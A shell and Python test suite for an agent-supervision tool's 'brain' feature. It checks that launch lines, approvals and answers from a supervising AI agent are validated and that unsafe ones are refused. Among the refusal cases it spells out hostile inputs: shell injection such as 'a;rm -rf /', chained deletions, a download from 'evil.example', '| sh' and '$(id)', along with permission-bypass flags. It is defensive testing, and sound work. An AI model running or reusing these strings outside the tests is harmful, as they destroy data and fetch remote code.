# shellcheck shell=bash
# Scope `brain`: `autopilot --loop --brain` — checking `ak pick` (pick-v2) and
# the launch line, the brain's lifecycle (launch in a workspace of the
# daemon's own, brief, lease, replacement, release and close), the questions
# and their closed action lists, `autopilot answer` and who may answer, the
# allowed actions, defaults and caps. Fakes only: no real account is used.

B_SCRIPTS="$ROOT/skills/herdr-peers/scripts"

# --- the launch line from pick-v2 ------------------------------------------------------------
run python3 - "$B_SCRIPTS" "$ROOT/tests/fixtures/screens/claude__blocked__permission_bash.screen" <<'PY'
import copy, shlex, sys
sys.dont_write_bytecode = True
sys.path.insert(0, sys.argv[1])
import brain as B
AK = '/opt/ak/bin/ak'
good = {'schema': 'pick-v2', 'interface': 1, 'qualifies': True, 'kind': 'claude', 'cli': 'claude',
        'profile': '@work1', 'launch': {'argv': ['ak', 'claude', '@work1', '--model', 'sonnet'],
                                        'env_names': [], 'permissions': 'ask'}}
kind, profile, argv, line = B.launch_line(good, AK)
assert (kind, profile) == ('claude', '@work1')
assert argv == [AK, 'claude', '@work1', '--ask', '--trust-cwd', '--model', 'sonnet'], argv
assert shlex.split(line) == argv
def refused(mut, why):
    doc = copy.deepcopy(good); mut(doc)
    try:
        B.launch_line(doc, AK)
    except B.PickRefused:
        return
    raise AssertionError('accepted: ' + why)
refused(lambda d: d.update(schema='pick-v1'), 'another schema')
refused(lambda d: d.update(interface=2), 'another interface')
refused(lambda d: d.update(qualifies=False), 'nothing qualifies')
refused(lambda d: d['launch'].update(permissions='auto'), 'an autonomous launch')
refused(lambda d: d['launch'].update(argv=['/bin/sh', 'claude', '@work1']), 'not ak')
refused(lambda d: d['launch'].update(argv=['ak', 'codex', '@work1']), 'a kind that is not the pick')
refused(lambda d: d['launch'].update(argv=['ak', 'claude', '@other']), 'a profile that is not the pick')
refused(lambda d: d['launch'].update(argv=['ak', 'claude', '@work1', '--dangerously-skip-permissions']), 'an unknown flag')
refused(lambda d: d['launch'].update(argv=['ak', 'claude', '@work1', '--auto']), 'an autonomy flag')
refused(lambda d: d['launch'].update(argv=['ak', 'claude', '@work1', '--model']), 'a flag without value')
refused(lambda d: d['launch'].update(argv=['ak', 'claude', '@work1', '--model', '-x']), 'a dash-leading value')
refused(lambda d: d['launch'].update(argv=['ak', 'claude', '@work1', '--model', 'a;rm -rf /']), 'a model with shell syntax')
refused(lambda d: d['launch'].update(argv=['ak', 'claude', '@work1', 'extra']), 'an extra word')
refused(lambda d: d['launch'].update(argv=['ak', 'claude;x', '@work1']), 'a kind with shell syntax')
# blockers the brain may be asked about
plan = lambda reason, needs='', cls=None, resolver='lead': {'blocker_class': cls, 'detail': {'blocker': {'reason': reason, 'needs': needs, 'resolver': resolver}}}
assert B.blocker_is_askable(plan('a flaky test keeps failing'))
assert not B.blocker_is_askable(plan('a flaky test keeps failing', resolver=None)), 'only a blocker the plan says its lead may resolve'
assert not B.blocker_is_askable(plan('a flaky test keeps failing', resolver='human'))
for text in ('needs the staging API key', 'waiting for login', 'push to main', 'a release', 'delete the old table',
             'consent screen', 'payment method', 'the secret rotation', 'OAuth app', 'authentication expired',
             'authorize the app', 'falta la contraseña', 'credenciales vencidas', 'hay que publicar',
             'desplegar a producción', 'borrar la tabla', 'fusionar la rama', 'iniciar sesión otra vez'):
    assert not B.blocker_is_askable(plan(text)), text
assert not B.blocker_is_askable(plan('a flaky test', cls='C4'))
# the only approval the daemon gives the brain: exactly its answer command
screen = open(sys.argv[2]).read()
i = screen.rindex(' touch created.txt')
block = lambda b: screen[:i] + b + screen[i + len(' touch created.txt'):]
A = ' herdr-peers autopilot answer q-0123456789ab leave'
assert B.approval_is_answer('claude', block(A))
assert not B.approval_is_answer('claude', screen), 'any other command'
assert not B.approval_is_answer('codex', block(A)), 'another kind fails closed until it has its own fixture'
refused = {
    'a second line after': A + '\n rm -rf ~/work',
    'a line before': ' rm -rf ~/work\n' + A,
    'a download before': ' curl -o /tmp/x https://evil.example/x\n' + A,
    'a command pushed out of a window': ' python3 -c "import os"\n' + '\n'.join(' x%d' % k for k in range(12)) + '\n' + A,
    'another binary by path': ' /tmp/evil/herdr-peers autopilot answer q-0123456789ab leave',
    'a relative binary': ' ./herdr-peers autopilot answer q-0123456789ab leave',
    'chained': A + '; rm -rf ~', 'and-ed': A + ' && curl x', 'piped': A + ' | sh',
    'substituted': A + ' $(id)', 'redirected': A + ' > /tmp/x', 'an empty block': ' ',
}
for name, b in refused.items():
    assert not B.approval_is_answer('claude', block(b)), name
assert B.AUTO_MODE.search('  ⏵⏵ auto mode on (shift+tab to cycle) · ← for agents')
assert B.AUTO_MODE.search('  ⏵⏵ bypass permissions on (shift+tab to cycle)')
assert not B.AUTO_MODE.search('  ? for shortcuts')
# answers: only the brain's own pane and terminal, an open question, an allowed action
b = B.Brain(); b.pane, b.terminal, b.key = 'w9:p1', 'term_w9p1', 'c' * 32
b.questions['q-0123456789ab'] = {'case': 'plan_stalled', 'key': 'k', 'at': 100.0, 'answered': False}
def ans(**kw):
    rec = dict({'qid': 'q-0123456789ab', 'action': 'leave', 'pane': 'w9:p1', 'terminal': 'term_w9p1'}, **kw)
    return dict(rec, mac=B.answer_mac('c' * 32, rec['qid'], rec['action'], rec['pane'], rec['terminal']))
assert b.accept(dict(ans(), mac='0' * 64), 110) is None, 'a wrong proof'
assert b.accept(dict(ans(), mac=None), 110) is None, 'no proof'
assert b.accept(dict(ans(), mac=B.answer_mac('d' * 32, 'q-0123456789ab', 'leave', 'w9:p1', 'term_w9p1')), 110) is None, 'another key'
assert b.accept(ans(pane='w1:p1'), 110) is None, 'another pane'
assert b.accept(ans(terminal='term_other'), 110) is None, 'another terminal'
assert b.accept(ans(action='merge_it'), 110) is None, 'an action outside the list'
assert b.accept(ans(qid='q-ffffffffffff'), 110) is None, 'a question never asked'
assert b.accept(ans(), 100 + B.QUESTION_TTL + 1) is None, 'too late'
assert b.accept(ans(action='nudge_once_more'), 110)[1] == 'nudge_once_more'
assert b.accept(ans(), 111) is None, 'answered twice'
assert B.parse_answer_line('not json') is None and B.parse_answer_line('{"qid": "x", "action": "leave"}') is None
# caps
b = B.Brain()
for i in range(B.MAX_QUESTIONS):
    assert b.can_ask(1000 + i); b.asked.append(1000 + i)
assert not b.can_ask(1100) and b.can_ask(1000 + 3600 + B.MAX_QUESTIONS)
for i in range(B.MAX_REPLACEMENTS):
    assert b.can_launch(1000 + i); b.launches.append(1000 + i)
assert not b.can_launch(1100)
q = B.question_text('q-0123456789ab', 'plan_blocked', 'PLAN_1_a', 'local')
assert 'herdr-peers autopilot answer q-0123456789ab <action>' in q and 'ask_lead_to_resolve' in q
print('ok')
PY
assert_rc "pick-v2 is checked, the launch line is built and quoted, answers and blockers are judged" 0
assert_eq "(scripted brain checks ran to their end)" "ok" "$OUT"

# --- the keeper: lifecycle, questions, actions --------------------------------------------------
run python3 - "$B_SCRIPTS" "$ROOT/tests/fixtures/screens/claude__blocked__permission_bash.screen" <<'PY'
import sys
sys.dont_write_bytecode = True
sys.path.insert(0, sys.argv[1])
import autopilot, brain as B

now = [10000.0]
class IO(object):
    self_machine = None
    def __init__(self):
        self.rows = {'local': [], 'far': []}
        self.reports, self.sent, self.log, self.events = {}, [], [], []
        self.launched, self.released, self.answers, self.screens = [], [], [], {}
        self.fail_launch = False
        self.n = 0
    def sources(self): return ['local']
    def agents(self, m): return [dict(r) for r in self.rows.get(m, [])]
    def read(self, m, p): return self.screens.get(p, '')
    def state(self, m, p): return 'idle'
    def keys(self, *a): return True
    def prompt(self, m, p, text): self.sent.append((p, text)); return True
    def record(self, addr, kind, choice, outcome, dry, plan=None): self.log.append((outcome, addr, choice.cls, plan))
    def warn(self, addr, exc): raise exc
    def label(self, m): return m
    def identity(self): return {}
    def plans(self, m, panes, f): return self.reports.get(m, ('ok', {'plans': [], 'agents': []}))
    def save_fleet(self, t): pass
    def load_fleet(self): return None
    def event(self, e, dry): self.events.append(e['event'])
    def random_bytes(self, n):
        self.n += 1
        return (b'%06d' % self.n)[:n]
    def brain_launch(self, kinds, models, exclude=()):
        self.excluded_seen = list(exclude)
        if self.fail_launch:
            raise RuntimeError('no account')
        self.launched.append((tuple(kinds), dict(models)))
        p = 'w9:p%d' % len(self.launched)
        return {'pane': p, 'terminal': 'term_' + p, 'workspace': 'w9', 'kind': 'claude', 'profile': '@work1',
                'key': KEY}
    def brain_lease(self, k, p): return True
    def brain_release(self, k, p, w): self.released.append((k, p, w))
    owns = True
    def brain_owns(self, pane, ancestry): return self.owns
    def brain_answers(self, off):
        lines, self.answers = self.answers, []
        return lines, off
def row(pane, state='idle', seq=1, agent='claude'):
    return {'pane': pane, 'state': state, 'agent': agent, 'seq': seq, 'turn': seq, 'you': False, 'cwd': '/r'}
def plan(pid='PLAN_1_a', cls='open', lead='local:w1:p2', progress='0' * 16, block=None, blocker=None):
    return {'plan': pid, 'class': cls, 'lead': lead, 'epoch': 1, 'succession': [], 'lanes': [], 'repo_root': '/r',
            'plan_dir': '/r/x', 'blocker_class': block, 'progress': progress, 'state_updated_at': None,
            'updated_at': '2026-01-01T00:00:00Z', 'open_asks': 0, 'lead_in_repo': True,
            'detail': {'blocker': blocker} if blocker else None}
def fresh(**kw):
    io = IO()
    ap = autopilot.Autopilot(io, clock=lambda: now[0], sleep=lambda s: None, confirm=0, loop=True, grace=0,
                             brain={'kinds': ['claude', 'codex'], 'models': {'claude': 'sonnet'}}, **kw)
    return io, ap
def step(ap, s=60):
    now[0] += s; ap.run_pass()
KEY = 'a' * 32
def answer(io, qid, action, pane='w9:p1', key=KEY, mac=True):
    rec = {'qid': qid, 'action': action, 'pane': pane, 'terminal': 'term_' + pane}
    if mac:
        rec['mac'] = B.answer_mac(key, qid, action, pane, 'term_' + pane)
    import json as _j
    io.answers.append(_j.dumps(rec))
def last_q(io):
    return [t for p, t in io.sent if 'Question q-' in t][-1].split('Question ')[1].split(' ')[0]

# Launch on the first pass, brief once the agent is idle, never nudge it in prose.
io, ap = fresh()
ap.run_pass()
assert io.launched == [(('claude', 'codex'), {'claude': 'sonnet'})], io.launched
assert ap.brain.b.state == 'starting'
io.rows['local'] = [row('w9:p1', 'working')]
step(ap)
assert not [t for p, t in io.sent if p == 'w9:p1'], 'not briefed while working'
io.rows['local'] = [row('w9:p1', 'idle', 2)]
step(ap)
assert [t for p, t in io.sent if p == 'w9:p1'] == [B.BRIEF] and ap.brain.b.state == 'ready'
assert 'local:w9:p1' in ap.quiet
step(ap)
assert len([t for p, t in io.sent if p == 'w9:p1']) == 1, 'briefed once'
# The brain ends a turn asking in prose: it is never nudged (it waits for questions).
import os
prose = open(os.path.join(os.path.dirname(sys.argv[2]), 'codex__done__prose_question.screen')).read()
io.rows['local'] = [row('w9:p1', 'working', 3)]
step(ap)
io.rows['local'] = [row('w9:p1', 'done', 4)]
io.screens['w9:p1'] = prose
step(ap)
assert len([t for p, t in io.sent if p == 'w9:p1']) == 1, 'the brain is never nudged in prose'
io.screens['w9:p1'] = ''

# A stalled plan is put to the brain; nudge_once_more gives exactly one more prompt.
io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2')]
io.reports['local'] = ('ok', {'plans': [plan()], 'agents': []})
for _ in range(8):
    for r in io.rows['local']:
        if r['pane'] == 'w1:p2':
            r['seq'] += 1; r['turn'] += 1
    step(ap, 1500)
    if 'plan_stalled' in io.events:
        break                    # the brain was just asked; answer within its time
leads = [t for p, t in io.sent if p == 'w1:p2']
assert len(leads) == 3, len(leads)
assert io.events.count('plan_stalled') == 1
qid = last_q(io)
assert 'plan has not advanced' in [t for p, t in io.sent if qid in t][0]
answer(io, qid, 'nudge_once_more')
step(ap, 60)                     # the answer is read on the next pass, inside its time
assert any(o[2] == 'brain_nudge_once_more' for o in io.log), io.log[-3:]
for r in io.rows['local']:
    if r['pane'] == 'w1:p2':
        r['seq'] += 1; r['turn'] += 1
step(ap, 1500)
step(ap, 1500)
assert len([t for p, t in io.sent if p == 'w1:p2']) == 4, 'exactly one more prompt'
# A second nudge_once_more for the same plan is not honoured.
asked = len([t for p, t in io.sent if 'Question q-' in t])
for _ in range(6):
    for r in io.rows['local']:
        if r['pane'] == 'w1:p2':
            r['seq'] += 1; r['turn'] += 1
    step(ap, 1500)
    if len([t for p, t in io.sent if 'Question q-' in t]) > asked:
        break                    # stalled again: the brain is asked again
qid2 = last_q(io)
assert qid2 != qid, 'the plan stalled again and the brain was asked again'
answer(io, qid2, 'nudge_once_more')
step(ap, 60)
for r in io.rows['local']:
    if r['pane'] == 'w1:p2':
        r['seq'] += 1; r['turn'] += 1
step(ap, 1500); step(ap, 1500)
assert len([t for p, t in io.sent if p == 'w1:p2']) == 4, 'nudge_once_more is honoured once per plan'

# A blocked plan with an askable blocker: ask_lead_to_resolve sends the fixed text once.
io, ap = fresh()
io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2')]
ap.run_pass(); step(ap)
io.reports['local'] = ('ok', {'plans': [plan(cls='blocked', blocker={'reason': 'a flaky test', 'needs': 'a retry', 'resolver': 'lead'})], 'agents': []})
step(ap, 400)   # past the report cadence: the new report is fetched
qid = last_q(io)
answer(io, qid, 'ask_lead_to_resolve')
step(ap); step(ap)
lead = [t for p, t in io.sent if p == 'w1:p2']
assert lead == [B.RESOLVE_TEXT % 'PLAN_1_a'], lead
# The answer is bound to the blocker it was about: the plan unblocks and blocks again,
# or its blocker becomes another one, before the prompt: nothing is sent.
for change in ('unblock', 'other', 'another askable'):
    io, ap = fresh()
    io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2')]
    ap.run_pass(); step(ap)
    askable = plan(cls='blocked', blocker={'reason': 'a flaky test', 'needs': 'a retry', 'resolver': 'lead'})
    io.reports['local'] = ('ok', {'plans': [askable], 'agents': []})
    step(ap, 400)
    qid = last_q(io)
    io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2', 'working')]   # the lead is busy: no prompt yet
    answer(io, qid, 'ask_lead_to_resolve')
    step(ap)
    assert ap.plans.resolve, 'the answer was accepted and waits for the lead'
    if change == 'unblock':
        io.reports['local'] = ('ok', {'plans': [plan()], 'agents': []})
        step(ap, 400)
        assert not ap.plans.resolve, 'an unblocked plan drops the answer'
        io.reports['local'] = ('ok', {'plans': [askable], 'agents': []})
    elif change == 'another askable':   # still one the lead may resolve, but not the one asked about
        io.reports['local'] = ('ok', {'plans': [plan(cls='blocked', blocker={
            'reason': 'a lint error', 'needs': 'a fix', 'resolver': 'lead'})], 'agents': []})
    else:
        io.reports['local'] = ('ok', {'plans': [plan(cls='blocked', block='C1', blocker={
            'reason': 'needs approval to push', 'needs': 'the human', 'resolver': 'lead'})], 'agents': []})
    io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2', 'idle', 5)]
    step(ap, 400); step(ap)
    assert B.RESOLVE_TEXT % 'PLAN_1_a' not in [t for p, t in io.sent if p == 'w1:p2'], (change, io.sent)
# Answers carry the launch's key: none, or another key, is refused.
io, ap = fresh()
io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2')]
ap.run_pass(); step(ap)
io.reports['local'] = ('ok', {'plans': [plan(cls='blocked', blocker={'reason': 'a flaky test', 'resolver': 'lead'})], 'agents': []})
step(ap, 400)
qid = last_q(io)
answer(io, qid, 'notify_human', mac=False)
answer(io, qid, 'notify_human', key='b' * 32)
step(ap)
assert 'needs_human' not in io.events and sum(1 for o in io.log if o[2] == 'brain_answer_refused') == 2
answer(io, qid, 'notify_human')
step(ap)
assert io.events.count('needs_human') == 1, 'the keyed answer counts'
# A brain whose agent never comes up is retired after its start deadline, and the human told.
io, ap = fresh()
ap.run_pass()
io.rows['local'] = [row('w9:p1', 'working')]
step(ap, B.START_DEADLINE - 10)
assert ap.brain.b.state == 'starting'
step(ap, 20)
assert any(o[2] == 'brain_replaced' and o[1] == 'local:w9:p1' for o in io.log), io.log[-3:]
assert io.released and io.events.count('needs_human') == 1
# A usage limit in the brain's own pane is never keyed or prompted by the screen pass.
io, ap = fresh()
io.rows['local'] = [row('w9:p1', 'idle', 2)]
ap.run_pass(); step(ap)
sent = len(io.sent)
ap.panes.setdefault('local:w9:p1', autopilot.Pane())
ap.limit('local', 'w9:p1', 'local:w9:p1', 'claude', ap.panes['local:w9:p1'],
         autopilot.Decision('leave', 'usage_limit', 'x'), '', 'idle')
now[0] += autopilot.LIMIT_RETRY + 1
ap.limit('local', 'w9:p1', 'local:w9:p1', 'claude', ap.panes['local:w9:p1'],
         autopilot.Decision('leave', 'usage_limit', 'x'), '', 'idle')
assert len(io.sent) == sent and not ap.panes['local:w9:p1'].limit_at, 'the brain pane is not the limit retry'
# ...but a sensitive blocker is never put to the brain.
io, ap = fresh()
io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2')]
ap.run_pass(); step(ap)
io.reports['local'] = ('ok', {'plans': [plan(cls='blocked', blocker={'reason': 'needs the deploy token', 'needs': '', 'resolver': 'lead'})], 'agents': []})
step(ap); step(ap)
assert not [t for p, t in io.sent if 'Question q-' in t], 'a sensitive blocker is not asked'
# notify_human emits the event; an invalid answer or silence gives the default.
io, ap = fresh()
io.rows['local'] = [row('w9:p1', 'idle', 2), row('w1:p2')]
ap.run_pass(); step(ap)
io.reports['local'] = ('ok', {'plans': [plan(cls='blocked', blocker={'reason': 'a flaky test', 'resolver': 'lead'})], 'agents': []})
step(ap, 400)   # past the report cadence: the new report is fetched
qid = last_q(io)
answer(io, qid, 'notify_human', pane='w1:p2')     # not the brain's pane
answer(io, qid, 'push_to_main')                   # not an allowed action
step(ap)
assert 'needs_human' not in io.events
assert sum(1 for o in io.log if o[2] == 'brain_answer_refused') == 2
io.owns = False
answer(io, qid, 'notify_human')                   # the brain's pane, but not under its process
step(ap)
assert 'needs_human' not in io.events, 'an answer not run under the brain process is refused'
io.owns = True
answer(io, qid, 'notify_human')
step(ap)
assert io.events.count('needs_human') == 1
io.reports['local'] = ('ok', {'plans': [plan('PLAN_2_b', cls='blocked', blocker={'reason': 'a slow job', 'resolver': 'lead'})], 'agents': []})
step(ap, 400)   # past the report cadence: the new report is fetched
step(ap, B.QUESTION_TTL + 1)
assert any(o[2] == 'brain_default' for o in io.log), 'silence gives the default'
# No pass waits on the brain: a pass returns although the brain never answers.
assert ap.run_pass()['pass'] > 0

# A brain that is gone or at its usage limit is replaced, at most 3 launches an hour.
io, ap = fresh()
io.rows['local'] = [row('w9:p1', 'idle', 2)]
ap.run_pass(); step(ap)
io.rows['local'] = []
step(ap)
assert io.released and len(io.launched) == 2, (io.released, io.launched)
for _ in range(4):
    io.rows['local'] = [row(ap.brain.b.pane, 'idle', 2)]
    step(ap)
    io.rows['local'] = []
    step(ap)
assert len(io.launched) == B.MAX_REPLACEMENTS, len(io.launched)
# A failed launch is recorded and retried within the cap; a dry run launches nothing.
io, ap = fresh()
io.fail_launch = True
ap.run_pass()
assert any(o[2] == 'brain_launch_failed' for o in io.log)
io = IO()
ap = autopilot.Autopilot(io, clock=lambda: now[0], sleep=lambda s: None, confirm=0, loop=True, dry_run=True,
                         brain={'kinds': ['claude']})
ap.run_pass()
assert io.launched == [], 'a dry run launches nothing'
# The screen pass approves nothing in the brain's pane but its own answer command.
screen = open(sys.argv[2]).read()
io, ap = fresh()
io.rows['local'] = [row('w9:p1', 'idle', 2)]
ap.run_pass(); step(ap)
keyed = []
io.keys = lambda m, p, k: keyed.append(p) or True
io.rows['local'] = [row('w9:p1', 'blocked', 3)]
io.screens['w9:p1'] = screen
step(ap)
assert keyed == [], 'a permission prompt in the brain pane is never keyed'
assert any(o[2] == 'brain_permission_refused' for o in io.log)
assert io.events.count('needs_human') == 1, 'the human is told once'
i = screen.rindex(' touch created.txt')
io.screens['w9:p1'] = screen[:i] + ' herdr-peers autopilot answer q-0123456789ab leave' + screen[i + len(' touch created.txt'):]
io.rows['local'] = [row('w9:p1', 'blocked', 4)]
step(ap)
assert keyed and set(keyed) == {'w9:p1'}, 'its own answer command is approved (the fake screen does not move, so twice)'
# A brain whose profile starts in auto or bypass mode is retired at once, its profile excluded.
io, ap = fresh()
ap.run_pass()
io.rows['local'] = [row('w9:p1', 'idle', 2)]
io.screens['w9:p1'] = 'Claude Code\n\n❯ \n  ⏵⏵ auto mode on (shift+tab to cycle) · ← for agents'
step(ap)
assert not [t for p, t in io.sent if p == 'w9:p1'], 'never briefed'
assert any(o[2] == 'brain_replaced' for o in io.log) and io.released, io.log[-3:]
assert io.events.count('needs_human') == 1
step(ap)
assert io.excluded_seen == ['@work1'], io.excluded_seen
# The brain closes: lease released, workspace closed.
io, ap = fresh()
ap.run_pass()
ap.brain.close()
assert io.released == [('claude', '@work1', 'w9')]
print('ok')
PY
assert_rc "the brain's lifecycle, questions, allowed actions, defaults and caps hold" 0
assert_eq "(scripted keeper checks ran to their end)" "ok" "$OUT"

# --- end to end through the helper, against fakes ------------------------------------------------
new_world brain
export FAKE_AK_DIR="$WORLD/ak"; mkdir -p "$FAKE_AK_DIR"
BIN="$WORLD/bin"; mkdir -p "$BIN"; ln -s "$ROOT/tests/fakes/agentkit/ak" "$BIN/ak"
OLDPATH=$PATH; export PATH="$BIN:$PATH"
cat >"$FAKE_AK_DIR/pick-v2.json" <<'JSON'
{"schema": "pick-v2", "interface": 1, "qualifies": true, "kind": "claude", "cli": "claude", "profile": "@work1",
 "launch": {"argv": ["ak", "claude", "@work1", "--model", "sonnet"], "env_names": []}}
JSON
run "$HELPER" autopilot --once --brain
assert_rc "--brain without --loop is a usage error" 2
run "$HELPER" autopilot --loop --once --brain --brain-kinds 'claude;x'
assert_rc "a malformed --brain-kinds is a usage error" 2
run "$HELPER" autopilot --loop --once --brain --brain-model codex=sonnet --brain-kinds claude
assert_rc "a model for a kind not in the list is a usage error" 2
echo 1.2.0 >"$FAKE_AK_DIR/version"
run "$HELPER" autopilot --loop --once --brain
assert_rc "--brain refuses a coding-agents-kit older than 1.3.0" 2
assert_contains "and names the version it needs" "$ERR" "coding-agents-kit 1.3.0 or later"
rm -f "$FAKE_AK_DIR/version"
: >"$FAKE_AK_DIR/argv.log"
mkdir -p "$(state_dir)"; printf '{"qid": "q-0123456789ab", "action": "leave"}\n' >"$(state_dir)/brain-answers.ndjson"
run "$HELPER" autopilot --loop --once --brain --brain-model claude=sonnet
assert_rc "a loop pass with a brain exits 0" 0
assert_eq "a launch starts the answers file empty (an earlier brain's answers are void)" "0" "$(wc -c <"$(state_dir)/brain-answers.ndjson" | tr -d ' ')"
WSLOG0=$(cat "$FAKE_HERDR_DIR/local/workspaces.log")
assert_contains "the launch key is put in the brain's environment" "$WSLOG0" '"HERDR_PEERS_BRAIN_KEY='
assert_not_contains "and never typed" "$(cat "$FAKE_HERDR_DIR/local/runs.log")" "HERDR_PEERS_BRAIN_KEY"
assert_contains "pick runs in ask mode" "$(cat "$FAKE_AK_DIR/env.log")" "AGENTKIT_PERMISSIONS=ask"
assert_contains "with the kinds, the model and the owner" "$(cat "$FAKE_AK_DIR/argv.log")" "pick --kinds claude,codex,grok --model-for claude=sonnet --owner local:w1:p1 --max-age 300 --json"
assert_contains "the account is leased first" "$(cat "$FAKE_AK_DIR/argv.log")" "lease claude @work1 --owner local:w1:p1 --ttl 4h --purpose brain"
WSLOG=$(cat "$FAKE_HERDR_DIR/local/workspaces.log")
case "$WSLOG" in *"\"--cwd\", \"$(state_dir)/brain-"*) t_ok "the brain's home is a fresh directory of its own";; *) t_fail "the brain's home is a fresh directory of its own" "$WSLOG";; esac
assert_not_contains "never the state directory itself" "$WSLOG" "\"--cwd\", \"$(state_dir)\"]"
if ls -d "$(state_dir)"/brain-*/ >/dev/null 2>&1; then t_fail "its home is removed when the brain is closed"; else t_ok "its home is removed when the brain is closed"; fi
assert_contains "its shell finds this very helper first on PATH" "$WSLOG" "PATH=$ROOT/skills/herdr-peers/scripts:"
assert_contains "a workspace of its own is created" "$(cat "$FAKE_HERDR_DIR/local/workspaces.log")" '"--label", "autopilot brain"'
RUNLINE=$(cat "$FAKE_HERDR_DIR/local/runs.log")
assert_contains "the brain starts in that workspace's fresh pane" "$RUNLINE" '"pane": "w9:p1"'
assert_contains "with ask mode and folder trust added" "$RUNLINE" "claude @work1 --ask --trust-cwd --model sonnet"
assert_contains "and the resolved ak path first" "$RUNLINE" "$(python3 -c 'import os,sys; print(os.path.realpath(sys.argv[1]))' "$BIN/ak")"
assert_contains "the map shows the brain" "$(cat "$XDG_STATE_HOME/herdr-peers/fleet.json")" '"profile": "@work1"'
run "$HELPER" fleet ui --snapshot --width 160
assert_contains "and the watcher's header shows it" "$OUT" "brain ◎ claude @work1 starting"
assert_contains "on stop the lease is released" "$(cat "$FAKE_AK_DIR/argv.log")" "lease release claude @work1 --owner local:w1:p1"
assert_contains "and its own workspace closed" "$(cat "$FAKE_HERDR_DIR/local/workspaces.log")" '"verb": "close", "args": ["w9"]'
# a launch that fails after the lease leaks nothing: lease released, home removed
: >"$FAKE_AK_DIR/argv.log"
run env FAKE_HERDR_FAIL="workspace create" "$HELPER" autopilot --loop --once --brain
assert_rc "a failed workspace create does not fail the pass" 0
assert_contains "the lease is released" "$(cat "$FAKE_AK_DIR/argv.log")" "lease release claude @work1"
if ls -d "$(state_dir)"/brain-*/ >/dev/null 2>&1; then t_fail "and the brain home removed"; else t_ok "and the brain home removed"; fi
# an answers line longer than a read never stalls the reader
python3 - "$ROOT/skills/herdr-peers/scripts" <<'PY'
import os, sys
sys.dont_write_bytecode = True
sys.path.insert(0, sys.argv[1])
import herdr_peers
io = herdr_peers.AutopilotIO(herdr_peers.Store(), 'w1:p1', None, None, quiet=True)
path = os.path.join(io.store.dir, herdr_peers.BRAIN_ANSWERS)
open(path, 'w').write('x' * (70 * 1024))
lines, off = io.brain_answers(0)
assert lines == [] and off == 70 * 1024, (len(lines), off)
open(path, 'a').write('{"qid": "q-0123456789ab", "action": "leave"}\n')
lines, off = io.brain_answers(off)
assert len(lines) == 1, lines
PY
assert_eq "an answers line longer than a read is skipped and later answers are read" "0" "$?"
# an autonomous pick, a lease held by another owner: nothing typed
for case in auto lease; do
  new_world "brain_$case"
  export FAKE_AK_DIR="$WORLD/ak"; mkdir -p "$FAKE_AK_DIR"
  printf '{"schema": "pick-v2", "interface": 1, "qualifies": true, "kind": "claude", "cli": "claude", "profile": "@work1", "launch": {"argv": ["ak", "claude", "@work1"], "env_names": [], "permissions": "%s"}}\n' \
    "$([ "$case" = auto ] && echo auto || echo ask)" >"$FAKE_AK_DIR/pick-v2.json"
  [ "$case" = lease ] && echo 1 >"$FAKE_AK_DIR/lease-rc"
  run "$HELPER" autopilot --loop --once --brain
  assert_rc "a refused launch ($case) does not fail the pass" 0
  if [ -s "$FAKE_HERDR_DIR/local/runs.log" ]; then t_fail "a refused launch ($case) types nothing"; else t_ok "a refused launch ($case) types nothing"; fi
  assert_contains "and is recorded" "$("$HELPER" log --json 2>/dev/null)" "brain_launch_failed"
done
# the answer verb
new_world brain_answer
run "$HELPER" autopilot answer q-0123456789ab nudge_once_more
assert_rc "autopilot answer outside the brain's environment is refused" 6
if [ -e "$(state_dir)/brain-answers.ndjson" ]; then t_fail "and records nothing"; else t_ok "and records nothing"; fi
export HERDR_PEERS_BRAIN_KEY=0123456789abcdef0123456789abcdef
run "$HELPER" autopilot answer q-0123456789ab nudge_once_more
assert_rc "autopilot answer records an answer" 0
assert_contains "with its pane and terminal" "$(cat "$(state_dir)/brain-answers.ndjson")" '"pane": "w1:p1"'
assert_contains "and the launch key's proof" "$(cat "$(state_dir)/brain-answers.ndjson")" '"mac": "'
assert_not_contains "never the key itself" "$(cat "$(state_dir)/brain-answers.ndjson")" "$HERDR_PEERS_BRAIN_KEY"
assert_eq "the answers file is private" "600" "$(python3 -c 'import os,sys; print(oct(os.stat(sys.argv[1]).st_mode & 0o777)[2:])' "$(state_dir)/brain-answers.ndjson")"
run "$HELPER" autopilot answer not-an-id leave
assert_rc "a malformed question id is a usage error" 2
run "$HELPER" autopilot answer q-0123456789ab "rm -rf"
assert_rc "an action that is not one word is a usage error" 2
run "$HELPER" autopilot run q-0123456789ab
assert_rc "answer arguments outside answer are a usage error" 2
unset HERDR_PEERS_BRAIN_KEY
export PATH=$OLDPATH
unset FAKE_AK_DIR
